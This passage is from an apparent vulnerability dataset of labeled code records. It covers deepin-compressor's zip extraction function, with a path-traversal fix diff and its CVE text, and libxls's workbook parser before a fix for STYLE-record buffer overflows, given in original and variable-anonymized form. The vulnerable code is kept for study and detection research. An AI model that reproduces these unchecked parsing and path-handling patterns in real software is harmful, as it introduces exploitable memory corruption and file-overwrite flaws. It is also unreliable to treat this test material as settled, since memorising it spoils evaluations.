    if (QDir().exists(options.strTargetPath) == false)
        QDir().mkpath(options.strTargetPath);

    // 
    QString strDestFileName = options.strTargetPath + QDir::separator() + strFileName;

    QFile file(strDestFileName);

    // Store parent mtime.
    QString parentDir;
    if (strFileName.endsWith(QDir::separator())) {
        QDir pDir = QFileInfo(strDestFileName).dir();
        pDir.cdUp();
        parentDir = pDir.path();
    } else {
        parentDir = QFileInfo(strDestFileName).path();
    }
    // For top-level items, don't restore parent dir mtime.
    const bool restoreParentMtime = (parentDir != options.strTargetPath);

    time_t parent_mtime;
    if (restoreParentMtime) {
        parent_mtime = QFileInfo(parentDir).lastModified().toMSecsSinceEpoch() / 1000;
    }

    // 
    zip_uint8_t opsys;
    zip_uint32_t attributes;
    if (zip_file_get_external_attributes(archive, zip_uint64_t(index), ZIP_FL_UNCHANGED, &opsys, &attributes) == -1) {
        emit error((""Failed to read metadata for entry: %1""));
    }

    // 
    mode_t value = mode_t();
    switch (opsys) {
    case ZIP_OPSYS_UNIX:
        value = attributes >> 16;
        break;
    default:    // TODO: non-UNIX.
        break;
    }
    bool isLink = false;
    if(S_ISLNK(value)) {
        isLink = true;
    }
    QFileDevice::Permissions per = getPermissions(value);

    if (bIsDirectory && !isLink) {     // 
        if (PATH_MAX < QString(strFileName).toLocal8Bit().length())
            return ET_LongNameError;

        QDir dir;
        dir.mkpath(strDestFileName);

        // 
        per = per | QFileDevice::ReadUser | QFileDevice::WriteUser | QFileDevice::ExeUser ;
    } else if(isLink) { //
        zip_file_t *zipFile = zip_fopen_index(archive, zip_uint64_t(index), 0);
        char buf[READBYTES] = {0};
        const auto readBytes = zip_fread(zipFile, buf, zip_uint64_t(READBYTES));
        if (readBytes > 0) {
            QString strBuf = QString(buf).toLocal8Bit();
            if (QFile::link(strBuf, strDestFileName)) {
                qInfo() << ""Symlink's created:"" << buf << strFileName;
            } else {
                qInfo() << ""Can't create symlink"" << buf << strFileName;
            }
        }
        file.close();
        zip_fclose(zipFile);
    } else {        // 

        // 
        if (file.exists()) {
            if (m_bSkipAll) {       // 
                m_mapLongName[tempFilePathName]++;   // 
                return ET_NoError;
            } else {
                if (!m_bOverwriteAll) {     // 

                    OverwriteQuery query(strDestFileName);

                    emit signalQuery(&query);
                    query.waitForResponse();

                    if (query.responseCancelled()) {
                        emit signalCancel();
                        return ET_UserCancelOpertion;
                    } else if (query.responseSkip()) {
                        m_mapLongName[tempFilePathName]++;   // 
                        return ET_NoError;
                    } else if (query.responseSkipAll()) {
                        m_bSkipAll = true;
                        m_mapLongName[tempFilePathName]++;   // 
                        return ET_NoError;
                    }  else if (query.responseOverwriteAll()) {
                        m_bOverwriteAll = true;
                    }
                }
            }
        }

        if (bHandleLongName) {
            m_setLongName << strFileName;
        }

        // 
        if (file.exists() && !file.isWritable()) {
            file.remove();
            file.setFileName(strDestFileName);
            file.setPermissions(QFileDevice::WriteUser);
        }

        // 
        if (QDir().exists(QFileInfo(strDestFileName).path()) == false)
            QDir().mkpath(QFileInfo(strDestFileName).path());

        zip_file_t *zipFile = zip_fopen_index(archive, zip_uint64_t(index), 0);
        // 
        if (nullptr == zipFile) {
            int iErr = zip_error_code_zip(zip_get_error(archive));
            if (ZIP_ER_WRONGPASSWD == iErr) {//

                // 
                bool bCheckFinished = false;
                int iCodecIndex = 0;
                while (nullptr == zipFile && false == bCheckFinished) {
                    if (m_listCodecs.length() == iCodecIndex) {
                        bCheckFinished = true;
                        if (file.exists()) {
                            file.remove();
                        }

                        return ET_WrongPassword;
                    } else {
                        // 115645 10605.12.0.2zip
                        zip_set_default_password(archive, passwordUnicode(m_strPassword, iCodecIndex).data());
                        iCodecIndex++;
                        zip_error_clear(archive);
                        zipFile = zip_fopen_index(archive, zip_uint64_t(index), 0);
                        iErr = zip_error_code_zip(zip_get_error(archive));
                        if (iErr != ZIP_ER_WRONGPASSWD && zipFile != nullptr) {//
                            bCheckFinished = true;
                        }
                    }
                }
            } else if (ZIP_ER_NOPASSWD == iErr) {   // 
                return ET_NeedPassword;
            } else {
                return ET_FileOpenError;
            }
        }

        // 
        if (file.open(QIODevice::WriteOnly) == false) {
            zip_fclose(zipFile);

            QList<QString> entryNameList = strDestFileName.split('/');
            foreach (auto &tmp, entryNameList) {
                // 
                if (NAME_MAX < tmp.toLocal8Bit().length()) {
                    return ET_LongNameError;
                }
            }

            emit signalFileWriteErrorName(QFileInfo(file.fileName()).fileName());
            return ET_FileWriteError;
        }

        // 
        QDataStream out(&file);
        zip_int64_t sum = 0;
        char buf[READBYTES];
        int writeSize = 0;
        double dScale = 1;
        // 
        if (!options.bExistList) {
            dScale = double(statBuffer.comp_size) / statBuffer.size;
        }
        while (sum != zip_int64_t(statBuffer.size)) {
            if (QThread::currentThread()->isInterruptionRequested()) {
                break;
            }

            if (m_bPause) { //
                sleep(1);
                continue;
            }

            const auto readBytes = zip_fread(zipFile, buf, zip_uint64_t(READBYTES));

            if (readBytes < 0) {
                file.close();
                zip_fclose(zipFile);
                emit signalFileWriteErrorName(QFileInfo(file.fileName()).fileName());
                return ET_FileWriteError;
            }

            if (out.writeRawData(buf, int(readBytes)) != readBytes) {
                file.close();
                zip_fclose(zipFile);

                if (isInsufficientDiskSpace(options.strTargetPath, static_cast<qint64>(readBytes))) {  // readBytes
                    return ET_InsufficientDiskSpace;
                } else {
                    emit signalFileWriteErrorName(QFileInfo(file.fileName()).fileName());
                    return ET_FileWriteError;
                }
            }

            sum += readBytes;
            writeSize += readBytes;

            // 
            qExtractSize += readBytes * dScale;
            emit signalprogress((double(qExtractSize)) * m_dScaleSize);
        }

        file.close();
        zip_fclose(zipFile);
    }
    if(!isLink) {
        // /
        file.setPermissions(per);

        // Set mtime for entry.
        utimbuf times;
        times.modtime = statBuffer.mtime;
        utime(strDestFileName.toUtf8().constData(), &times);

        if (restoreParentMtime) {
            // Restore mtime for parent dir.
            times.modtime = parent_mtime;
            utime(parentDir.toUtf8().constData(), &times);
        }
    }
    m_mapLongName[tempFilePathName]++;   // 
    return ET_NoError;
}","ErrorType LibzipPlugin::extractEntry(zip_t *VAR_0, zip_int64_t VAR_1, const ExtractionOptions &VAR_2, qlonglong &VAR_3, QString &VAR_4, bool &VAR_5)
{
    zip_stat_t VAR_6;
    if (zip_stat_index(VAR_0, zip_uint64_t(VAR_1), VAR_7, &VAR_6) != 0) {
        return VAR_8;
    }

    VAR_4 = VAR_9->trans2uft8(VAR_6.name, VAR_10[VAR_1]);    /* COMMENT_0 */
    /* COMMENT_1 */
    if(VAR_4.indexOf(""../"") != -1) {
        qInfo() << ""skipped ../ path component(s) in "" << VAR_4;
        VAR_4 = VAR_4.replace(""../"", """");
    }
    if(VAR_4.contains(QLatin1Char('\\')))
        VAR_4 = VAR_4.replace(QLatin1Char('\\'), QDir::separator());
    QString VAR_11 = VAR_4;

    /* COMMENT_2 */
/* COMMENT_3 */
/* COMMENT_4 */
/* COMMENT_5 */
/* COMMENT_6 */
/* COMMENT_7 */
/* COMMENT_8 */
/* COMMENT_9 */
/* COMMENT_10 */

    QString VAR_12;
    QString VAR_13 = VAR_4;
    int VAR_14 = VAR_4.lastIndexOf(QDir::separator());

    if (VAR_14 >= 0) {
        VAR_12 = VAR_4.left(VAR_14);   /* COMMENT_11 */
        VAR_13 = VAR_4.right(VAR_4.length() - VAR_14 - 1);
    }

    QString VAR_15;
    if(!VAR_16) {
        QString VAR_17 = VAR_9->handleLongNameforPath(VAR_12, VAR_4, VAR_18, VAR_19);
        if(VAR_17.length() > 0) {
           VAR_12 = VAR_17.endsWith(QDir::separator())?VAR_17.left(VAR_17.length() -1):VAR_17;
           if(VAR_4.endsWith(QDir::separator())) {
               VAR_4 = VAR_17;
           } else if (VAR_20 >= QString(VAR_13).toLocal8Bit().length()) {
               VAR_4 = VAR_17 + VAR_13;
           }
           if(!VAR_18.isEmpty()) {
               VAR_5 = true;
           }
        }
        if (VAR_20 < QString(VAR_13).toLocal8Bit().length() && !VAR_13.endsWith(QDir::separator())) {
            QString VAR_21 = VAR_13.left(VAR_22);

            /* COMMENT_12 */
            VAR_15 = VAR_12 + QDir::separator() + VAR_21;   /* COMMENT_13 */
            if (VAR_23[VAR_15] >= VAR_24 ) {
                return VAR_25;
            }
            VAR_5 = true;
            QString VAR_26 = QFileInfo(VAR_13).completeSuffix();
            if(10 < VAR_26.length()){
                VAR_26 = QFileInfo(VAR_13).suffix();
                if(10 < VAR_26.length()) {
                    VAR_26 = VAR_26.right(10);
                }
            }
            VAR_13 = VAR_21 + QString(""(%1)"").arg(VAR_23[VAR_15] + 1, VAR_27, VAR_28, QChar('0')) + ""."" + VAR_26;

            VAR_4 = VAR_13;
            if (VAR_14 >= 0) {
                VAR_4 = VAR_12 + QDir::separator() + VAR_13;
            }

        }
    }

    /* COMMENT_14 */
    if (!VAR_2.strDestination.isEmpty()) {
        if(VAR_5) {
            int VAR_29 = VAR_2.strDestination.count(QDir::separator());
            int VAR_30 = 0;
            for(int VAR_31 = 0; VAR_31 < VAR_29; VAR_31++){
                VAR_30 = VAR_4.indexOf(QDir::separator(), VAR_30);
                VAR_30++;
            }
            VAR_4 = VAR_4.remove(0, VAR_30);
        } else {
            VAR_4 = VAR_4.remove(0, VAR_2.strDestination.size());
        }
    }


    if (VAR_5) {
        emit signalCurFileName(strOriginName); /* COMMENT_15 */
    } else {
        emit signalCurFileName(strFileName); /* COMMENT_15 */
    }

    bool VAR_32 = strFileName.endsWith(QDir::separator());    /* COMMENT_16 */

    /* COMMENT_17 */
    if (QDir().exists(VAR_2.strTargetPath) == false)
        QDir().mkpath(VAR_2.strTargetPath);

    /* COMMENT_18 */
    QString VAR_33 = VAR_2.strTargetPath + QDir::separator() + strFileName;

    QFile file(strDestFileName);

    /* COMMENT_19 */
    QString VAR_34;
    if (strFileName.endsWith(QDir::separator())) {
        QDir VAR_35 = QFileInfo(strDestFileName).dir();
        VAR_35.cdUp();
        VAR_34 = VAR_35.path();
    } else {
        VAR_34 = QFileInfo(strDestFileName).path();
    }
    /* COMMENT_20 */
    const bool VAR_36 = (VAR_34 != VAR_2.strTargetPath);

    time_t VAR_37;
    if (VAR_36) {
        VAR_37 = QFileInfo(VAR_34).lastModified().toMSecsSinceEpoch() / 1000;
    }

    /* COMMENT_21 */
    zip_uint8_t VAR_38;
    zip_uint32_t VAR_39;
    if (zip_file_get_external_attributes(VAR_0, zip_uint64_t(VAR_1), VAR_40, &VAR_38, &VAR_39) == -1) {
        emit VAR_41((""Failed to read metadata for entry: %1""));
    }

    /* COMMENT_22 */
    mode_t VAR_42 = mode_t();
    switch (VAR_38) {
    case VAR_43:
        VAR_42 = VAR_39 >> 16;
        break;
    default:    /* COMMENT_23 */
        break;
    }
    bool VAR_44 = false;
    if(S_ISLNK(VAR_42)) {
        VAR_44 = true;
    }
    QFileDevice::Permissions VAR_45 = getPermissions(VAR_42);

    if (VAR_32 && !VAR_44) {     /* COMMENT_24 */
        if (VAR_46 < QString(strFileName).toLocal8Bit().length())
            return VAR_25;

        QDir VAR_47;
        VAR_47.mkpath(strDestFileName);

        /* COMMENT_25 */
        VAR_45 = VAR_45 | QFileDevice::ReadUser | QFileDevice::WriteUser | QFileDevice::ExeUser ;
    } else if(VAR_44) { /* COMMENT_26 */
        zip_file_t *VAR_48 = zip_fopen_index(VAR_0, zip_uint64_t(VAR_1), 0);
        char VAR_49[VAR_50] = {0};
        const auto VAR_51 = zip_fread(VAR_48, VAR_49, zip_uint64_t(VAR_50));
        if (VAR_51 > 0) {
            QString VAR_52 = QString(VAR_49).toLocal8Bit();
            if (QFile::link(VAR_52, strDestFileName)) {
                qInfo() << ""Symlink's created:"" << VAR_49 << strFileName;
            } else {
                qInfo() << ""Can't create symlink"" << VAR_49 << strFileName;
            }
        }
        VAR_53.close();
        zip_fclose(VAR_48);
    } else {        /* COMMENT_27 */

        /* COMMENT_28 */
        if (VAR_53.exists()) {
            if (VAR_54) {       /* COMMENT_29 */
                VAR_23[VAR_15]++;   /* COMMENT_30 */
                return VAR_55;
            } else {
                if (!VAR_56) {     /* COMMENT_31 */

                    OverwriteQuery query(strDestFileName);

                    emit VAR_57(&VAR_58);
                    VAR_58.waitForResponse();

                    if (VAR_58.responseCancelled()) {
                        emit signalCancel();
                        return VAR_59;
                    } else if (VAR_58.responseSkip()) {
                        VAR_23[VAR_15]++;   /* COMMENT_30 */
                        return VAR_55;
                    } else if (VAR_58.responseSkipAll()) {
                        VAR_54 = true;
                        VAR_23[VAR_15]++;   /* COMMENT_30 */
                        return VAR_55;
                    }  else if (VAR_58.responseOverwriteAll()) {
                        VAR_56 = true;
                    }
                }
            }
        }

        if (VAR_5) {
            VAR_60 << strFileName;
        }

        /* COMMENT_32 */
        if (VAR_53.exists() && !VAR_53.isWritable()) {
            VAR_53.remove();
            VAR_53.setFileName(strDestFileName);
            VAR_53.setPermissions(QFileDevice::WriteUser);
        }

        /* COMMENT_33 */
        if (QDir().exists(QFileInfo(strDestFileName).path()) == false)
            QDir().mkpath(QFileInfo(strDestFileName).path());

        zip_file_t *VAR_48 = zip_fopen_index(VAR_0, zip_uint64_t(VAR_1), 0);
        /* COMMENT_34 */
        if (nullptr == VAR_48) {
            int VAR_61 = zip_error_code_zip(zip_get_error(VAR_0));
            if (VAR_62 == VAR_61) {/* COMMENT_35 */

                /* COMMENT_36 */
                bool VAR_63 = false;
                int VAR_64 = 0;
                while (nullptr == VAR_48 && false == VAR_63) {
                    if (VAR_65.length() == VAR_64) {
                        VAR_63 = true;
                        if (VAR_53.exists()) {
                            VAR_53.remove();
                        }

                        return VAR_66;
                    } else {
                        /* COMMENT_37 */
                        zip_set_default_password(VAR_0, passwordUnicode(VAR_67, VAR_64).data());
                        VAR_64++;
                        zip_error_clear(VAR_0);
                        VAR_48 = zip_fopen_index(VAR_0, zip_uint64_t(VAR_1), 0);
                        VAR_61 = zip_error_code_zip(zip_get_error(VAR_0));
                        if (VAR_61 != VAR_62 && VAR_48 != nullptr) {/* COMMENT_38 */
                            VAR_63 = true;
                        }
                    }
                }
            } else if (VAR_68 == VAR_61) {   /* COMMENT_39 */
                return VAR_69;
            } else {
                return VAR_70;
            }
        }

        /* COMMENT_40 */
        if (VAR_53.open(QIODevice::WriteOnly) == false) {
            zip_fclose(VAR_48);

            QList<QString> VAR_71 = strDestFileName.split('/');
            foreach (auto &VAR_72, entryNameList) {
                /* COMMENT_41 */
                if (VAR_20 < VAR_72.toLocal8Bit().length()) {
                    return VAR_25;
                }
            }

            emit VAR_73(QFileInfo(VAR_53.fileName()).fileName());
            return VAR_74;
        }

        /* COMMENT_42 */
        QDataStream VAR_75(&VAR_53);
        zip_int64_t VAR_76 = 0;
        char VAR_49[VAR_50];
        int VAR_77 = 0;
        double VAR_78 = 1;
        /* COMMENT_43 */
        if (!VAR_2.bExistList) {
            VAR_78 = double(VAR_6.comp_size) / VAR_6.size;
        }
        while (VAR_76 != zip_int64_t(VAR_6.size)) {
            if (QThread::currentThread()->isInterruptionRequested()) {
                break;
            }

            if (VAR_79) { /* COMMENT_44 */
                sleep(1);
                continue;
            }

            const auto VAR_51 = zip_fread(VAR_48, VAR_49, zip_uint64_t(VAR_50));

            if (VAR_51 < 0) {
                VAR_53.close();
                zip_fclose(VAR_48);
                emit VAR_73(QFileInfo(VAR_53.fileName()).fileName());
                return VAR_74;
            }

            if (VAR_75.writeRawData(VAR_49, int(VAR_51)) != VAR_51) {
                VAR_53.close();
                zip_fclose(VAR_48);

                if (isInsufficientDiskSpace(VAR_2.strTargetPath, VAR_80<qint64>(VAR_51))) {  /* COMMENT_45 */
                    return VAR_81;
                } else {
                    emit VAR_73(QFileInfo(VAR_53.fileName()).fileName());
                    return VAR_74;
                }
            }

            VAR_76 += VAR_51;
            VAR_77 += VAR_51;

            /* COMMENT_46 */
            VAR_3 += VAR_51 * VAR_78;
            emit VAR_82((double(VAR_3)) * VAR_83);
        }

        VAR_53.close();
        zip_fclose(VAR_48);
    }
    if(!VAR_44) {
        /* COMMENT_47 */
        VAR_53.setPermissions(VAR_45);

        /* COMMENT_48 */
        utimbuf VAR_84;
        VAR_84.modtime = VAR_6.mtime;
        utime(strDestFileName.toUtf8().constData(), &VAR_84);

        if (VAR_36) {
            /* COMMENT_49 */
            VAR_84.modtime = VAR_37;
            utime(VAR_34.toUtf8().constData(), &VAR_84);
        }
    }
    VAR_23[VAR_15]++;   /* COMMENT_30 */
    return VAR_55;
}",linuxdeepin/deepin-compressor/82f668c78c133873f5094cfab6e4eabc0b70e4b6/libzipplugin.cpp/vul/after/0.json,"--- func_before
+++ func_after
@@ -6,6 +6,11 @@
     }
 
     strFileName = m_common->trans2uft8(statBuffer.name, m_mapFileCode[index]);    // 
+    //fix 232873
+    if(strFileName.indexOf(""../"") != -1) {
+        qInfo() << ""skipped ../ path component(s) in "" << strFileName;
+        strFileName = strFileName.replace(""../"", """");
+    }
     if(strFileName.contains(QLatin1Char('\\')))
         strFileName = strFileName.replace(QLatin1Char('\\'), QDir::separator());
     QString strOriginName = strFileName;","{'deleted_lines': [], 'added_lines': ['    //fix 232873', '    if(strFileName.indexOf(""../"") != -1) {', '        qInfo() << ""skipped ../ path component(s) in "" << strFileName;', '        strFileName = strFileName.replace(""../"", """");', '    }']}",True,"Deepin-Compressor is the default archive manager of Deepin Linux OS. Prior to 5.12.21, there's a path traversal vulnerability in deepin-compressor that can be exploited to achieve Remote Command Execution on the target system upon opening crafted archives. Users are advised to update to version 5.12.21 which addresses the issue. There are no known workarounds for this vulnerability.
",9.3,CRITICAL,3,valid,2023-12-11T09:45:01Z,4
CVE-2023-38851,['CWE-787'],CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,libxls,"Fix buffer overflows when parsing style records

Closes #124, #126.

According to https://download.microsoft.com/download/5/0/1/501ED102-E53F-4CE0-AA6B-B0F93629DDC6/Office/Excel97-2007BinaryFileFormat(xls)Specification.pdf
a ""STYLE: Style Information (293h)"" record might be 4 or 3+ bytes
long, depending on the first word.

We need to check that we've read enough bytes for the whole
record, so
- first we check that we have a word at least,
- then we check the subtype of the record.
- If it is a built-in style, then it has 4 bytes, so we check that.
- Otherwise the length of the name is in byte 3, so the whole record
  is 3 + buf[3] bytes long. So we need at least three bytes before we
  check the length in byte 3. Then we check if we have 3 + buf[3]
  bytes.",c009fa87fc775f8cc63e85d2018223143cb200e6,https://github.com/libxls/libxls/commit/c009fa87fc775f8cc63e85d2018223143cb200e6,src/xls.c,xls_parseWorkBook,"xls_error_t xls_parseWorkBook(xlsWorkBook* pWB)
{
if(!pWB) return LIBXLS_ERROR_NULL_ARGUMENT;
BOF bof1 = { .id = 0, .size = 0 };
BOF bof2 = { .id = 0, .size = 0 };
BYTE* buf = NULL;
BYTE once = 0;
xls_error_t retval = LIBXLS_OK;
verbose (""xls_parseWorkBook"");
do {
if(xls_debug > 10) {
printf(""READ WORKBOOK filePos=%ld\n"",  (long)pWB->filepos);
printf(""  OLE: start=%d pos=%u size=%u fatPos=%u\n"",
pWB->olestr->start, (unsigned int)pWB->olestr->pos,
(unsigned int)pWB->olestr->size, (unsigned int)pWB->olestr->fatpos); 
}
if (ole2_read(&bof1, 1, 4, pWB->olestr) != 4) {
retval = LIBXLS_ERROR_READ;
goto cleanup;
}
xlsConvertBof(&bof1);
if(xls_debug) xls_showBOF(&bof1);
if (bof1.size) {
if ((buf = realloc(buf, bof1.size)) == NULL) {
if (xls_debug) fprintf(stderr, ""Error: failed to allocate buffer of size %d\n"", (int)bof1.size);
retval = LIBXLS_ERROR_MALLOC;
goto cleanup;
}
if (ole2_read(buf, 1, bof1.size, pWB->olestr) != bof1.size) {
if (xls_debug) fprintf(stderr, ""Error: failed to read OLE block\n"");
retval = LIBXLS_ERROR_READ;
goto  cleanup;
}
}
if (xls_isRecordTooSmall(pWB, &bof1)) {
retval = LIBXLS_ERROR_PARSE;
goto cleanup;
}
switch (bof1.id) {
case XLS_RECORD_EOF:
break;
case XLS_RECORD_BOF:            pWB->is5ver = (buf[0] + (buf[1] << 8) != 0x600);
pWB->type = buf[2] + (buf[3] << 8);
if(xls_debug) {
printf(""version: %s\n"", pWB->is5ver ? ""BIFF5"" : ""BIFF8"" );
printf(""   type: %.2X\n"", pWB->type);
}
break;
case XLS_RECORD_CODEPAGE:
pWB->codepage = buf[0] + (buf[1] << 8);
if(xls_debug) printf(""codepage: %d\n"", pWB->codepage);
break;
case XLS_RECORD_CONTINUE:
if(once) {
if (bof2.id==XLS_RECORD_SST) {
if ((retval = xls_appendSST(pWB,buf,bof1.size)) != LIBXLS_OK)
goto cleanup;
}
bof1=bof2;
}
break;
case XLS_RECORD_WINDOW1:
{
WIND1 *w = (WIND1*)buf;
xlsConvertWindow(w);
pWB->activeSheetIdx = w->itabCur;
if(xls_debug) {
printf(""WINDOW1: "");
printf(""xWn    : %d\n"", w->xWn/20);
printf(""yWn    : %d\n"", w->yWn/20);
printf(""dxWn   : %d\n"", w->dxWn/20);
printf(""dyWn   : %d\n"", w->dyWn/20);
printf(""grbit  : %d\n"", w->grbit);
printf(""itabCur: %d\n"", w->itabCur);
printf(""itabFi : %d\n"", w->itabFirst);
printf(""ctabSel: %d\n"", w->ctabSel);
printf(""wTabRat: %d\n"", w->wTabRatio);
}
}
break;
case XLS_RECORD_SST:
xlsConvertSst((SST *)buf);
if ((retval = xls_addSST(pWB,(SST*)buf,bof1.size)) != LIBXLS_OK) {
goto cleanup;
}
break;
case XLS_RECORD_EXTSST:
break;
case XLS_RECORD_BOUNDSHEET:
{
BOUNDSHEET *bs = (BOUNDSHEET *)buf;
xlsConvertBoundsheet(bs);
if ((retval = xls_addSheet(pWB, bs, bof1.size)) != LIBXLS_OK) {
goto cleanup;
}
}
break;
case XLS_RECORD_XF:
if(pWB->is5ver) {
XF5 *xf;
xf = (XF5 *)buf;
xlsConvertXf5(xf);
if ((retval = xls_addXF5(pWB,xf)) != LIBXLS_OK) {
goto cleanup;
}
if(xls_debug) {
printf(""   font: %d\n"", xf->font);
printf("" format: %d\n"", xf->format);
printf(""   type: %.4x\n"", xf->type);
printf(""  align: %.4x\n"", xf->align);
printf(""rotatio: %.4x\n"", xf->color);
printf(""  ident: %.4x\n"", xf->fill);
printf(""usedatt: %.4x\n"", xf->border);
printf(""linesty: %.4x\n"", xf->linestyle);
}
} else {
XF8 *xf;
xf = (XF8 *)buf;
xlsConvertXf8(xf);
if ((retval = xls_addXF8(pWB,xf)) != LIBXLS_OK) {
goto cleanup;
}
if(xls_debug) {
xls_showXF(xf);
}
}
break;
case XLS_RECORD_FONT:
case XLS_RECORD_FONT_ALT:
{
char *s;
FONT *f = (FONT*)buf;
xlsConvertFont(f);
s = xls_addFont(pWB,f, bof1.size);
if(xls_debug) {
printf("" height: %d\n"", f->height);
printf(""   flag: 0x%x\n"", f->flag);
printf(""  color: 0x%x\n"", f->color);
printf("" weight: %d\n"", f->bold);
printf(""escapem: 0x%x\n"", f->escapement);
printf(""underln: 0x%x\n"", f->underline);
printf("" family: 0x%x\n"", f->family);
printf(""charset: 0x%x\n"", f->charset);
if(s) printf(""   name: %s\n"", s);
}
}
break;
case XLS_RECORD_FORMAT:
xlsConvertFormat((FORMAT *)buf);
if ((retval = xls_addFormat(pWB, (FORMAT*)buf, bof1.size)) != LIBXLS_OK) {
goto cleanup;
}
break;
case XLS_RECORD_STYLE:
if(xls_debug) {
struct { unsigned short idx; unsigned char ident; unsigned char lvl; } *styl;
styl = (void *)buf;
printf(""    idx: 0x%x\n"", styl->idx & 0x07FF);
if(styl->idx & 0x8000) {
printf(""  ident: 0x%x\n"", styl->ident);
printf(""  level: 0x%x\n"", styl->lvl);
} else {
char *s = get_string((char *)&buf[2], bof1.size - 2, 1, pWB);
printf(""  name=%s\n"", s);
free(s);
}
}
break;
case XLS_RECORD_PALETTE:
if(xls_debug > 10) {
unsigned char *p = buf + 2;
int idx, len;
len = buf[0] + (buf[1] << 8);
for(idx=0; idx<len; ++idx) {
printf(""   Index=0x%2.2x %2.2x%2.2x%2.2x\n"", idx+8, p[0], p[1], p[2] );
p += 4;
}
}
break;
case XLS_RECORD_1904:
pWB->is1904 = *(BYTE *)buf;if(xls_debug) {
printf(""   mode: 0x%x\n"", pWB->is1904);
}
break;
case XLS_RECORD_FILEPASS:
retval = LIBXLS_ERROR_UNSUPPORTED_ENCRYPTION;
goto cleanup;
case XLS_RECORD_DEFINEDNAME:
if(xls_debug) {
int i;
printf(""   DEFINEDNAME: "");
for(i=0; i<bof1.size; ++i) printf(""%2.2x "", buf[i]);
printf(""\n"");
}
break;
default:
if(xls_debug)
{
printf(""    Not Processed in parseWorkBook():  BOF=0x%4.4X size=%d\n"", bof1.id, bof1.size);
}
break;
}
bof2=bof1;
once=1;
}
while ((!pWB->olestr->eof)&&(bof1.id!=XLS_RECORD_EOF));
cleanup:
if (buf)
free(buf);
return retval;
}","xls_error_t xls_parseWorkBook(xlsWorkBook* VAR_0)
{
if(!VAR_0) return VAR_1;
BOF VAR_2 = { .id = 0, .size = 0 };
BOF VAR_3 = { .id = 0, .size = 0 };
BYTE* VAR_4 = NULL;
BYTE VAR_5 = 0;
xls_error_t VAR_6 = VAR_7;
verbose (""xls_parseWorkBook"");
do {
if(VAR_8 > 10) {
printf(""READ WORKBOOK filePos=%ld\n"",  (long)VAR_0->filepos);
printf(""  OLE: start=%d pos=%u size=%u fatPos=%u\n"",
VAR_0->olestr->start, (unsigned int)VAR_0->olestr->pos,
(unsigned int)VAR_0->olestr->size, (unsigned int)VAR_0->olestr->fatpos); 
}
if (ole2_read(&VAR_2, 1, 4, VAR_0->olestr) != 4) {
VAR_6 = VAR_9;
goto cleanup;
}
xlsConvertBof(&VAR_2);
if(VAR_8) xls_showBOF(&VAR_2);
if (VAR_2.size) {
if ((VAR_4 = realloc(VAR_4, VAR_2.size)) == NULL) {
if (VAR_8) fprintf(VAR_10, ""Error: failed to allocate buffer of size %d\n"", (int)VAR_2.size);
VAR_6 = VAR_11;
goto cleanup;
}
if (ole2_read(VAR_4, 1, VAR_2.size, VAR_0->olestr) != VAR_2.size) {
if (VAR_8) fprintf(VAR_10, ""Error: failed to read OLE block\n"");
VAR_6 = VAR_9;
goto  cleanup;
}
}
if (xls_isRecordTooSmall(VAR_0, &VAR_2)) {
VAR_6 = VAR_12;
goto cleanup;
}
switch (VAR_2.id) {
case VAR_13:
break;
case VAR_14:
VAR_0->is5ver = (VAR_4[0] + (VAR_4[1] << 8) != 0x600);
VAR_0->type = VAR_4[2] + (VAR_4[3] << 8);
if(VAR_8) {
printf(""version: %s\n"", VAR_0->is5ver ? ""BIFF5"" : ""BIFF8"" );
printf(""   type: %.2X\n"", VAR_0->type);
}
break;
case VAR_15:
VAR_0->codepage = VAR_4[0] + (VAR_4[1] << 8);
if(VAR_8) printf(""codepage: %d\n"", VAR_0->codepage);
break;
case VAR_16:
if(VAR_5) {
if (VAR_3.id==VAR_17) {
if ((VAR_6 = xls_appendSST(VAR_0,VAR_4,VAR_2.size)) != VAR_7)
goto cleanup;
}
VAR_2=VAR_3;
}
break;
case VAR_18:
{
WIND1 *VAR_19 = (WIND1*)VAR_4;
xlsConvertWindow(VAR_19);
VAR_0->activeSheetIdx = VAR_19->itabCur;
if(VAR_8) {
printf(""WINDOW1: "");
printf(""xWn    : %d\n"", VAR_19->xWn/20);
printf(""yWn    : %d\n"", VAR_19->yWn/20);
printf(""dxWn   : %d\n"", VAR_19->dxWn/20);
printf(""dyWn   : %d\n"", VAR_19->dyWn/20);
printf(""grbit  : %d\n"", VAR_19->grbit);
printf(""itabCur: %d\n"", VAR_19->itabCur);
printf(""itabFi : %d\n"", VAR_19->itabFirst);
printf(""ctabSel: %d\n"", VAR_19->ctabSel);
printf(""wTabRat: %d\n"", VAR_19->wTabRatio);
}
}
break;
case VAR_17:
xlsConvertSst((SST *)VAR_4);
if ((VAR_6 = xls_addSST(VAR_0,(SST*)VAR_4,VAR_2.size)) != VAR_7) {
goto cleanup;
}
break;
case VAR_20:
break;
case VAR_21:
{
BOUNDSHEET *VAR_22 = (BOUNDSHEET *)VAR_4;
xlsConvertBoundsheet(VAR_22);
if ((VAR_6 = xls_addSheet(VAR_0, VAR_22, VAR_2.size)) != VAR_7) {
goto cleanup;
}
}
break;
case VAR_23:
if(VAR_0->is5ver) {
XF5 *VAR_24;
VAR_24 = (XF5 *)VAR_4;
xlsConvertXf5(VAR_24);
if ((VAR_6 = xls_addXF5(VAR_0,VAR_24)) != VAR_7) {
goto cleanup;
}
if(VAR_8) {
printf(""   font: %d\n"", VAR_24->font);
printf("" format: %d\n"", VAR_24->format);
printf(""   type: %.4x\n"", VAR_24->type);
printf(""  align: %.4x\n"", VAR_24->align);
printf(""rotatio: %.4x\n"", VAR_24->color);
printf(""  ident: %.4x\n"", VAR_24->fill);
printf(""usedatt: %.4x\n"", VAR_24->border);
printf(""linesty: %.4x\n"", VAR_24->linestyle);
}
} else {
XF8 *VAR_24;
VAR_24 = (XF8 *)VAR_4;
xlsConvertXf8(VAR_24);
if ((VAR_6 = xls_addXF8(VAR_0,VAR_24)) != VAR_7) {
goto cleanup;
}
if(VAR_8) {
xls_showXF(VAR_24);
}
}
break;
case VAR_25:
case VAR_26:
{
char *VAR_27;
FONT *VAR_28 = (FONT*)VAR_4;
xlsConvertFont(VAR_28);
VAR_27 = xls_addFont(VAR_0,VAR_28, VAR_2.size);
if(VAR_8) {
printf("" height: %d\n"", VAR_28->height);
printf(""   flag: 0x%x\n"", VAR_28->flag);
printf(""  color: 0x%x\n"", VAR_28->color);
printf("" weight: %d\n"", VAR_28->bold);
printf(""escapem: 0x%x\n"", VAR_28->escapement);
printf(""underln: 0x%x\n"", VAR_28->underline);
